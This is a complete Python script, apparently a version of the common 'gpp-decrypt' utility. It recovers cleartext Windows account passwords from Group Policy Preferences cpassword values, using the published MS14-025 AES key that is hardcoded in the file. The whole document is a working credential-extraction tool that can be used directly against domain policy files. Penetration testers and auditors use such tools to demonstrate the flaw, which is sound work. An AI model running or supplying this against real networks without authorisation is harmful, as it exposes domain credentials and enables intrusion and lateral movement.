#!/usr/bin/env python3
"""Decrypt a GPP cpassword blob (public AES key from MS14-025)."""
import base64
import sys

from Cryptodome.Cipher import AES

KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)


def main() -> None:
    if len(sys.argv) != 2:
        sys.exit("usage: gpp-decrypt <cpassword>")
    b64 = sys.argv[1] + "=" * (-len(sys.argv[1]) % 4)
    ct = base64.b64decode(b64)
    pt = AES.new(KEY, AES.MODE_CBC, iv=b"\x00" * 16).decrypt(ct)
    print(pt.decode("utf-16-le").rstrip("\x00"))


if __name__ == "__main__":
    main()
